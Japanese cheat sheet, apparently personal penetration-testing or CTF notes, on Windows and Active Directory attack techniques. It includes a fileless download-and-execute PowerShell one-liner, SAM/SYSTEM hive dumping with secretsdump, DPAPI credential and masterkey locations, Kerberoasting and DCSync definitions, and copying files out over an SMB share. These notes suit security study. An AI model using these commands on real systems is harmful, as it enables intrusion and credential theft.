## 基本コマンド
```bash
New-Item <ファイル> # ファイル作成
"" > <ファイル名> # ファイル作成
Remove-Item <ファイル名> # ファイル削除
```

## ファイルをダウンロード
```powershell
wget <URL> -o <ダウンロード先のパスと保存名>
iwr -URI <URL> -o <ダウンロード先のパスと保存名>
```

## ファイル自体はダウンロードせずメモリ上で実行
```powershell
iex (New-Object Net.WebClient).DownloadString('<URL>')
```

## PSReadLineによる履歴ファイル
PowerShellの標準機能であるPSReadLineモジュールによって行われる。  
PowerShellセッションが終了する際、または一定のタイミングで、メモリ上の履歴リスト全体がファイル（ConsoleHost_history.txt）に自動的に書き込まれる。  
生成されるパス  
`C:\Users\<ユーザー名>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

## netコマンド
```cmd
net user # 存在するユーザーを表示
net use # マウントしているドライブを表示
net use \\<ホスト名など>\<フォルダ名> /user:<ユーザー名> <パスワード> # ドライブにマウントせずに接続のみ確立し、アクセスはUNCパスを使う
net use <ドライブ>: \\<ホスト名など>\<フォルダ名> /user:<ユーザー名> <パスワード> # 指定したドライブにマウント
net use <ドライブ>: /delete # マウントを削除
```

## Kerberos認証
- TGTの取得
1. クライアントがKDCのASにTGTを要求(AS_REQ)。ユーザーIDとAuthenticatorを送信。
2. ASがAuthenticatorを検証し、応答する(AS_REP)
3. ASがTGTとTGSセッションキーをクライアントへ送信。
- サービスチケットの取得
1. クライアントがKDCのTGSに特定のサービスへのアクセスを要求。TGTとTGSセッションキーで暗号化したAuthenticator, アクセスしたいサービスのSPNを送信。
2. TGSが要求の正当性を検証し、サービスチケットとサービスセッションキーをクライアントへ送信。
- サービスの利用
1. クライアントが目的のサービスへのアクセスを要求。サービスチケットとサービスセッションキーで暗号化したAuthenticatorを送信。
2. サービスが検証し、アクセスを許可。

## Kerberos関連の用語
- Authenticatorとは  
タイムスタンプをNTハッシュで暗号化したもの、KDCとやりとりするためネットワークへ流れる。
- NTハッシュとは  
ユーザーが設定したパスワードをUTF-16LE変換し、MD4ハッシュ化したもの。
- KDCとは  
TGTの発行と管理を行う。
- TGSとは  
サービスチケットの発行と管理を行う。
- DC（ドメインコントローラー）とは  
Active Directory Domain Servicesを実行しているっサーバーであり、認証と認可を担っている。
- SPNとは  
サービスを実行しているアカウント（サービスアカウント、もしくはコンピュータアカウント）に紐付けられるもの。

## Kerberoastingとは
SPNが登録されているアカウントのパスワードハッシュを抜き取る攻撃手法。

## DCSyncとは
DCの情報同期（レプリケーション）機能を使って全ユーザーのNTLMハッシュを取得する攻撃手法。  
DCに対してGetChangesAll, GetChangesの権限があれば成功する可能性が高い。

## ssh関連
秘密鍵のファイル名  
`id_rsa`, `id_ed25519`  
公開鍵のファイル名  
`id_rsa.pub`, `id_ed25519.pub`  
ファイルパス  
`C:\Users\<ユーザー名>\.ssh\`  
公開鍵登録パス  
`C:\Users\<ユーザー名>\.ssh\authorized_keys`

## 特権
`SeBackupPrivilege` 通常Backup Operatorsグループのメンバーやシステムアカウントに付与される特権。Windowsの通常ACLを無視してアクセスできる。  
```bash
# レジストリからNTLMハッシュの奪取
reg save hklm\sam sam # SAMレジストリを保存
reg save hklm\system system # SYSTEMレジストリを保存
download sam # evil-winrmを使用したダウンロード
download system # evil-winrmを使用したダウンロード
impacket-secretsdump -sam sam -system system local

# robocopyを使用した管理者フォルダのコピー
robocopy /b C:\Users\Administrator\Desktop\ C:\
```
`SeLoadDriverPrivilege` 新しいデバイスドライバーをカーネルメモリにロードする特権。BYOVDにつながる。

## グループ
```bash
Server Operators # Windows ServerやActive Directory環境において、サーバーの運用管理に関する一定の権限を持つ、組み込みの特殊なセキュリティグループ。サービスを利用して権限昇格の可能性あり。
```

## ETWとは
Event Tracing for Windowsの略。OSやアプリケーションの挙動をリアルタイムに監視しているカーネルレベルのシステム。  
ETWはログに書き込まれる前に検知に加えて、イベントログにない情報も取得可能。  
`ntdll.dll`に工夫するとバイパスできることがある。
以下の3つで構成される。
- Provider: ファイルを開く、書き込むなどのイベントを発生させる。
- Controller: どのProviderからどの情報を取るか決める。
- Consumer: 流れてきたイベントを受け取って処理をする。

## mdbとは
Microsoft Access Databaseという古いバージョンのデータベース形式
```bash
mdb-tables <ファイル> # テーブルを表示
mdb-schema <ファイル>
mdb-export <ファイル> <テーブル>
mdb-sql <ファイル> # SQLクエリを使用可能にする
mdb-sql -d '|' -P <ファイル> # SQLクエリで見やすくパイプ区切りにする
```

## pstとは
Outlookで送受信したメールや、連絡先などのデータをローカルで保存するためのファイル形式。  
`readpst <ファイル>`

## DPAPIについて
Data Protection APIの略で、パスワード、クッキー、証明書などを暗号化して保存するためのAPI。  
`/savecred`などの資格情報もDPAPIによって暗号化されてディスクに保存されている。  
DPAPIで暗号化されたファイルを復号するにはMasterkeyが必要で、`dir /S /AS`を使って探すことができる。  
`runas /savecred`、資格情報を記憶するにチェック、Outlookなどがパスワードを保存しているといった場合に下記のコマンドで探すことができる。
```powershell
dir /S /AS C:\Users\<ユーザー>\AppData\Local\Microsoft\Vault # ブラウザの自動補完、アプリケーションが保存したパスワード
dir /S /AS C:\Users\<ユーザー>\AppData\Local\Microsoft\Credentials # ローカル端末関連のパスワード
dir /S /AS C:\Users\<ユーザー>\AppData\Local\Microsoft\Protect # 端末固有のデータのmasterkey
dir /S /AS C:\Users\<ユーザー>\AppData\Roaming\Microsoft\Vault # あまり使われない
dir /S /AS C:\Users\<ユーザー>\AppData\Roaming\Microsoft\Credentials # ドメインネットワーク内の共有フォルダのアクセス権や/savecredなどのデータ
dir /S /AS C:\Users\<ユーザー>\AppData\Roaming\Microsoft\Protect # ユーザーごとのデータのmasterkey
```

## Linuxへのファイルコピー
```bash
# linuxで実行
impacket-smbserver <共有名> $(pwd) -smb2support
# windowsで実行
net use X: \\<Linux IP>\<共有名>
copy/xcopy <送信ファイル> X:\<保存名> #もしくは robocopy <ディレクトリ> X:\ <送信ファイル>
```

## attrib
`attrib -H -S <隠しファイルなど> # 隠しとシステム属性を解除`
